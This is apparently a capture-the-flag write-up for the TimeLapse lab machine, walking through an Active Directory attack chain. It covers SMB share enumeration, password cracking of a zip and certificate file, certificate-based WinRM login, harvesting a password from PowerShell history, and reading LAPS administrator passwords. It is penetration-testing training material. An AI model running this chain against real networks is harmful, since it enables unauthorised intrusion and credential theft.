---
description: >-
  This is a CTF that covers really good topics involving Enumeration and Active
  Directory (AD)
cover: >-
  https://images.unsplash.com/photo-1501139083538-0139583c060f?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHw1fHx0aW1lcnxlbnwwfHx8fDE3MDkzMzU1OTN8MA&ixlib=rb-4.0.3&q=85
coverY: -46
---

# ⏳ TimeLapse (10.10.11.152)

## Scanning

As per usual, we should start with a Nmap scan:

```bash
nmap -T4 -A -p- 10.10.11.152 -Pn


Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-01 08:39 EST
Nmap scan report for 10.10.11.152
Host is up (0.16s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2024-03-01T21:45:13+00:00; +8h00m00s from scanner time.
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49728/tcp open  msrpc         Microsoft Windows RPC
65480/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time: 
|   date: 2024-03-01T21:44:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 341.33 seconds
```



## Enumeration

We can see that SMB is open and running on this server, so we can start our Enumeration phase with this service.

First, we can try listing all the shares available on this service:

```bash
smbclient -L \\\\10.10.11.152\\ -N

#-L = list shares
#-N = no password
```

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption><p>SMB Shares Enumeration</p></figcaption></figure>

We can see that the share named "_Shares_" stands out, so we can try connecting to it anonymously since we still don't have credentials at this point.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Inside the SMB Share named "Shares"</p></figcaption></figure>

Inside this share, we can see two Directories, one of which ("Dev") contains a backup file. The "HelpDesk" Directory contains some LAPS (Local Administrator Password Solution) files made by Microsoft that foreshadow what's coming next but aren't of any use to us right now.



## Exploitation

So let's focus on the backup zipped file. If we try to unzip it, we're asked for a password:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Password required to access the zipped file</p></figcaption></figure>

We can use a tool called `fcrackzip` to crack the password:

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip

# -u = use unzip to weed out wrong passwords
# -D = dictionary
# -p = use string as initial password/file
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption><p>Password cracked</p></figcaption></figure>

Now we can see the contents of the zipped file, and we'll find a `.pfx` file, which also needs a password to be unlocked:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption><p>.pfx file</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption><p>We need another password</p></figcaption></figure>

Luckily, we're able to crack this password using "`John The Ripper`". The correct tool for this job is called "`pfx2john`". This tool will [convert this encrypted file into a hash of "_john format_" we can crack afterward](https://stackoverflow.com/a/57826783):

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption><p>pfx2john turns the encrypted file into a "john format" hash</p></figcaption></figure>

Next, we can grab this hash and crackit using "_John_":

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=pfx
```

<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption><p>Cracked password with john</p></figcaption></figure>

Once we got into the `.pfx` file, we can see a Private RSA Key and an Identity:

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption><p>Private RSA Key and Identity inside of the .pfx file</p></figcaption></figure>

After doing some research, I found out that it is possible to extract this key to use as authentication without the need for a password. This is called [Certificate-Based Authentication, which can be used to authenticate over WinRM](https://medium.com/r3d-buck3t/certificate-based-authentication-over-winrm-13197265c790).

To do this, we'll need to extract the `.key` file from the `.pfx` file:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out rsa.key

# pkcs12 = Archive file format for storing many cryptography objects as a single file
# -in = Input File
# -nocerts = Don't output certificates
# -out = output

```

<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption><p>RSA Private Key decrypted</p></figcaption></figure>

Now we'll need to extract the certificate:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt 

# pkcs12 = Archive file format for storing many cryptography objects as a single file
# -in = Input File
# -clcerts = Only output client certificates
# -nokeys = Don't output private keys
# -out = output
```

<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption><p>Certificate extracted</p></figcaption></figure>

###

### Gaining Shell Access

Once we have the certificate and the RSA Private Key, we can use both these files to authenticate to the target machine:

```bash
evil-winrm -S -i 10.10.11.152 -u legacyy -p [password] -c legacyy.crt -k rsa.key

#Syntax: evil-winrm -S -i [IP] -u [user] -p [password] -c [certificate].cer -k private.key
```

<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption><p>We have shell access</p></figcaption></figure>

We can find the user's flag on his Desktop:

<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption><p>User's flag</p></figcaption></figure>



## Privilege Escalation

Now that we have a shell, we can start looking for ways to escalate our privileges and gain Administrator/Root access. To do this, we'll need to repeat the Enumeration stage.



### Enumeration

First, we can enumerate the user accounts:

```powershell
net user
```

<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption><p>Users discovered</p></figcaption></figure>

If we enumerate further and do a net user command to every user, we'll be able to see some interesting things:

```powershell
net user sinfulz
#Domain User

net user TRX
#Domain User and Domain Admin

net user babywyrm
#Domain User

net user legacyy
#Remote Management Use; Domain User and Development Group

net user svc_deploy
#Remote Management Use; LAPS_Readers; Domain User

net user payl0ad
#Domain User; Domain Admin

net user thecybergeek
#Domain User; Domain Admin
```

We can also check the PowerShell history file for any interesting things like passwords and such.

This file can be found here:  `C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Here we'll be able to see the user svc\_deploy's password in plain text:

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption><p>svc_deploy password in plain text</p></figcaption></figure>

Now we can use BloodHound ingestor's `bloodhound-python` to enumerate further:

```bash
bloodhound-python -d timelapse.htb -u svc_deploy -p [password] -ns 10.10.11.152 -c all

# -d = domain
# -u = user
# -p = password
# -ns = nameserver
# -c = Collection Method. "all" collects everything except "LoggedOn"
```

Now we need to upload this information to BloodHound. To do this, we need to start neo4j and bloodhound

```bash
sudo neo4j console

sudo bloodhound
```

On BloodHound we can select the svc\_deploy user, click on "Outbound Object Control" under "Node Info" and click on "Group Delegated Object Control". There, we'll be able to see that the members of "LAPS\_READERS" group can "Read LAPS Password".

<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption><p>BloodHound Enumeration</p></figcaption></figure>



### Exploitation and Privilege Escalation

If we research how to read the LAPS Password, we'll come across [this article](https://smarthomepursuits.com/export-laps-passwords-powershell/) where we'll find the script to do so, which we're going to use to grab the Administrator's password:

```powershell
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
```

<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption><p>Administrator's Password in Plain Text</p></figcaption></figure>

Now we just need to login again to the machine as the Administrator and get the root flag.

If we enumerate enough of the "Administrator" directory, we won't be able to find the flag. Since I couldn't find it in the Administrator's Desktop or other folders, I remembered from our enumeration that TRX was also a Domain Admin, so I went to his desktop and there was the root flag:

<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption><p>Root flag</p></figcaption></figure>

And this was the CTF!&#x20;

Thank you so much for taking the time to read my WriteUp!

See you in another box!
